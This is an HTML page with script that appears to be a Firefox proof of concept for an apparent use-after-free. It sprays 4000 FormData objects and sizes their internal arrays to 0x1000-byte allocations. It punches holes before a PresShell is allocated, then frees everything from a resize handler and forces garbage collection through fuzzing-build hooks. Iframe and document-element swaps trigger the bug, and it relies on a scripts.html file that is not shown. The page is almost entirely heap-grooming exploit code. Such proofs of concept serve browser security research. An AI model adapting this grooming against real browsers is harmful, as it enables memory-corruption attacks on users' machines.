<script>
var formdatas = new Array(4000);

function spin () {
    var x=new XMLHttpRequest();
    x.open("POST","https://mozilla.org",false);
    try{x.send("X");}catch(e){}
}

function go() {
	for (i = 0; i < formdatas.length; i++) {
		formdatas[i] = new FormData();
	}
	for (var i = 0; i < formdatas.length; i++) {
		// 43 appends will cause FormData's internal array "mFormData" to re-allocate itself into a 0x1000 allocation
		for (var j = 0; j < 44-1; j++) {
			formdatas[i].append(null, null);
		}
	}	
}

function formdata_append_one(f) {
	f.append(null, null);
}
function formdata_delete_all(f) {
	f.delete(null);
}

function start() {
	Math.tan(1);
	o147=document.documentElement;
	o200=o147.querySelector('*:not([id])');
	o243=document.createElementNS('http://www.w3.org/1999/xhtml','iframe');
	o243.src='scripts.html';
	document.documentElement.appendChild(o243);
	// allocating 4000 formdata
	go()
	// reallocate mFormdata in each formdata to bigger allocation
	for (var i = 0; i < formdatas.length; i++) {
		formdata_append_one(formdatas[i]);
	}
	Math.tan(1);
}
function fun0(doc) {
	o519=doc;
	o527=o519.querySelector('*:not([id])');
	o593=document.createElementNS('http://www.w3.org/1999/xhtml','iframe');
	o200.appendChild(o593);
	Math.sin(1);
}
function fun1() {
	spin();
}
function fun2() {
	Math.sin(1);
	o200.setAttribute('style','all: unset');
	o697=o593.contentWindow;
	o698=o697.document;
	document.documentElement.appendChild(o698.replaceChild(o519.documentElement,o698.documentElement));
	o593.contentWindow.onresize=fun3;
	// before new PresSell is allocated: poke holes
	for (var i = 300; i < formdatas.length; i += 550) {
		formdata_delete_all(formdatas[i]);
	}
	Math.sin(1);
}
function fun3() {
	setTimeout(function() {
		Math.atan(1);

	}, 1000);
	// free all formdatas
	for (var i = 0; i < formdatas.length; i++) {
			formdata_delete_all(formdatas[i]);
	}
	FuzzingFunctions.garbageCollect();
	FuzzingFunctions.cycleCollect();
	FuzzingFunctions.garbageCollect();
	FuzzingFunctions.cycleCollect();
	Math.cos(1);
	document.documentElement.appendChild(o200);
	window.top.document.documentElement.appendChild(o527);
	Math.cos(1);

}
</script>
<body onload="start()"></body>
